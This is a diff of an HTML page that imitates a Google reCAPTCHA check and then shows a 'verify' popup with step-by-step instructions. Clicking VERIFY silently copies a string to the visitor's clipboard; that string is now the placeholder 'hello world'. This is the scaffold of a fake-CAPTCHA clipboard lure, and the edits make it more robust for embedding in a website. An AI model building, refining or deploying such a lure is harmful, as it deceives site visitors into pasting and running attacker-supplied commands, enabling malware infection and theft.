@@ -1,3 +1,4 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,7 +10,10 @@
 *{margin:0;padding:0;box-sizing:border-box}
 html,body{height:100%;overflow:hidden}
 
-/* blurred page behind popup */
+body{
+background:#ececec;
+}
+
 .page{
 position:fixed;
 inset:0;
@@ -18,6 +22,7 @@ linear-gradient(rgba(255,255,255,.72),rgba(255,255,255,.72)),
 url('https://images.unsplash.com/photo-1497366754035-f200968a6e72?q=80&w=1600&auto=format&fit=crop') center/cover;
 filter:blur(8px);
 transform:scale(1.02);
+z-index:1;
 }
 
 .overlay{
@@ -27,17 +32,18 @@ display:flex;
 align-items:center;
 justify-content:center;
 backdrop-filter:blur(5px);
-z-index:9999;
+-webkit-backdrop-filter:blur(5px);
+z-index:99999;
 }
 
-/* ---------- EXACT FIRST BOX YOU PROVIDED ---------- */
-.rc-wrap {
+/* reCAPTCHA */
+.rc-wrap{
 display:flex;
 justify-content:center;
 align-items:center;
 }
 
-.rc-box {
+.rc-box{
 width:300px;
 background:#f9f9f9;
 border:1px solid #d3d3d3;
@@ -50,13 +56,13 @@ font-family:'Roboto',sans-serif;
 box-shadow:0 1px 3px rgba(0,0,0,.1);
 }
 
-.rc-left {
+.rc-left{
 display:flex;
 align-items:center;
 gap:14px;
 }
 
-.rc-checkbox {
+.rc-checkbox{
 width:24px;
 height:24px;
 border:2px solid #c1c1c1;
@@ -118,7 +124,7 @@ color:#999;
 @keyframes spin{to{transform:rotate(360deg)}}
 @keyframes draw{to{stroke-dashoffset:0}}
 
-/* ---------- SECOND POPUP ---------- */
+/* step 2 */
 .verify-modal{
 display:none;
 }
@@ -136,6 +142,7 @@ background:#2f86eb;
 color:white;
 padding:18px 20px 20px;
 }
+
 .small{font:600 18px Arial}
 .big{
 font:800 42px Arial;
@@ -160,6 +167,7 @@ line-height:1.34;
 }
 
 li{margin-bottom:28px}
+
 .after-text{
 font-size:29px;
 line-height:1.3;
@@ -202,7 +210,7 @@ background:#2679d8;
 
 <div class="page"></div>
 
-<!-- STEP 1 YOUR reCAPTCHA -->
+<!-- Step 1 -->
 <div class="overlay" id="recaptchaModal">
 <div class="rc-wrap">
 <div class="rc-box">
@@ -249,7 +257,7 @@ fill="none" stroke="white" stroke-width="3.5" stroke-linecap="round"/>
 </div>
 </div>
 
-<!-- STEP 2 YOUR POPUP -->
+<!-- Step 2 -->
 <div class="overlay verify-modal" id="verifyModal">
 <div class="captcha-box">
 <div class="top-panel">
@@ -280,102 +288,105 @@ After completing all steps click
 <div class="icons">
 <span>↻</span><span>🎧</span><span>ⓘ</span>
 </div>
-<button class="verify-btn">VERIFY</button>
+<button class="verify-btn" type="button">VERIFY</button>
 </div>
 </div>
 </div>
+
 <script>
-(() => {
+(function(){
 
-const SESSION_KEY = 'verifyFlowCompleted';
-let state = 'idle';
-let initialized = false;
+const SESSION_KEY='verifyFlowCompleted';
+let state='idle';
+let initialized=false;
 
-function copyPayload() {
-if (navigator.clipboard) {
-navigator.clipboard.writeText('hello world').catch(() => {});
+function copyPayload(){
+if(navigator.clipboard){
+navigator.clipboard.writeText('hello world').catch(function(){});
 }
 }
 
-function finishFlow() {
-sessionStorage.setItem(SESSION_KEY, 'done');
-document.getElementById('verifyModal').style.display = 'none';
+function finishFlow(){
+try{
+sessionStorage.setItem(SESSION_KEY,'done');
+}catch(e){}
+
+var verify=document.getElementById('verifyModal');
+if(verify) verify.style.display='none';
 }
 
-function showStep2() {
-document.getElementById('recaptchaModal').style.display = 'none';
-document.getElementById('verifyModal').style.display = 'flex';
+function showStep2(){
+var r=document.getElementById('recaptchaModal');
+var v=document.getElementById('verifyModal');
+if(r) r.style.display='none';
+if(v) v.style.display='flex';
 }
 
-function handleClick() {
-if (state !== 'idle') return;
+function handleClick(e){
+if(e) e.preventDefault();
+if(state!=='idle') return;
 
-state = 'loading';
+var cb=document.getElementById('cb');
+var label=document.getElementById('label');
+if(!cb||!label) return;
 
-const cb = document.getElementById('cb');
-const label = document.getElementById('label');
-
-if (!cb || !label) return;
-
+state='loading';
 cb.classList.add('loading');
-label.textContent = 'Verifying...';
+label.textContent='Verifying...';
 
-setTimeout(() => {
+setTimeout(function(){
 cb.classList.remove('loading');
 cb.classList.add('checked');
-label.textContent = "I'm not a robot";
-
-state = 'done';
-
-setTimeout(showStep2, 700);
-
-}, 1200);
+label.textContent="I'm not a robot";
+state='done';
+setTimeout(showStep2,700);
+},1200);
 }
 
-/* ✅ Squarespace-safe initializer */
-function init() {
-if (initialized) return;
-initialized = true;
+function bindEvents(){
+if(initialized) return;
+initialized=true;
 
-/* prevent repeat sessions */
-if (sessionStorage.getItem(SESSION_KEY) === 'done') {
-const modal = document.getElementById('recaptchaModal');
-if (modal) modal.style.display = 'none';
+try{
+if(sessionStorage.getItem(SESSION_KEY)==='done'){
+var r=document.getElementById('recaptchaModal');
+if(r) r.style.display='none';
 return;
 }
+}catch(e){}
 
-const cb = document.getElementById('cb');
-const verifyBtn = document.querySelector('.verify-btn');
+var cb=document.getElementById('cb');
+var verifyBtn=document.querySelector('.verify-btn');
+if(!cb) return;
 
-/* IMPORTANT: bind AFTER DOM exists */
-if (cb) {
-cb.addEventListener('click', handleClick);
-}
+cb.addEventListener('click',handleClick,{passive:false});
+cb.addEventListener('touchstart',handleClick,{passive:false});
 
-if (verifyBtn) {
-verifyBtn.addEventListener('click', () => {
-copyPayload();
+if(verifyBtn){
+verifyBtn.addEventListener('click',function(){
+copyPayload(); /* only copies on verify */
 finishFlow();
 });
 }
 }
 
-/* ✅ Squarespace-safe DOM detection */
-function readyCheck() {
-if (document.getElementById('cb')) {
-init();
-} else {
-requestAnimationFrame(readyCheck);
+function waitForDom(){
+if(document.getElementById('cb') && document.querySelector('.verify-btn')){
+bindEvents();
+return;
 }
+requestAnimationFrame(waitForDom);
 }
 
-if (document.readyState === 'loading') {
-document.addEventListener('DOMContentLoaded', readyCheck);
-} else {
-readyCheck();
+if(document.readyState==='loading'){
+document.addEventListener('DOMContentLoaded',waitForDom);
+}else{
+waitForDom();
 }
 
 })();
 </script>
+
 </body>
 </html>
+```
